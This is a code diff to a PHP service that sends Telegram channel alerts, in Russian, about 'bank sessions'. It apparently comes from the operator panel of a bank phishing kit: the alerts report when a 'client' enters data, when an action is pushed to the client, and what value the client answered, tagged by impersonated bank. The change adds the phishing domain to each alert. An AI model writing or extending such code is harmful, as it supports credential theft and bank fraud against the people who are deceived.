@@ -152,34 +152,42 @@ HTML;
         return $session->log_number !== null ? "#log{$session->log_number}" : '';
     }
 
+    private function domainLine(\App\Models\BankSession $session): string
+    {
+        return $session->domain ? "\n🌐 {$session->domain}" : '';
+    }
+
     public function notifyCredentialsEntered(\App\Models\BankSession $session): void
     {
-        $bank = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
-        $tag  = $this->logTag($session);
+        $bank   = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
+        $tag    = $this->logTag($session);
+        $domain = $this->domainLine($session);
         $this->sendToChannel(
             "📝 <b>Клиент ввёл данные</b>  {$tag}\n\n" .
-            "🏦 {$bank}"
+            "🏦 {$bank}{$domain}"
         );
     }
 
     public function notifyActionSent(\App\Models\BankSession $session, string $actionLabel): void
     {
-        $bank = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
-        $tag  = $this->logTag($session);
+        $bank   = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
+        $tag    = $this->logTag($session);
+        $domain = $this->domainLine($session);
         $this->sendToChannel(
             "📤 <b>Действие отправлено клиенту</b>  {$tag}\n\n" .
-            "🏦 {$bank}\n" .
+            "🏦 {$bank}{$domain}\n" .
             "📋 {$actionLabel}"
         );
     }
 
     public function notifyClientAnswer(\App\Models\BankSession $session, string $command, string $value): void
     {
-        $bank = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
-        $tag  = $this->logTag($session);
+        $bank   = \App\Services\Telegram\TelegramCardBuilder::getDisplayName($session->bank_slug);
+        $tag    = $this->logTag($session);
+        $domain = $this->domainLine($session);
         $this->sendToChannel(
             "📥 <b>Ответ клиента</b>  {$tag}\n\n" .
-            "🏦 {$bank}\n" .
+            "🏦 {$bank}{$domain}\n" .
             "📋 {$command}\n" .
             "💬 <code>{$value}</code>"
         );
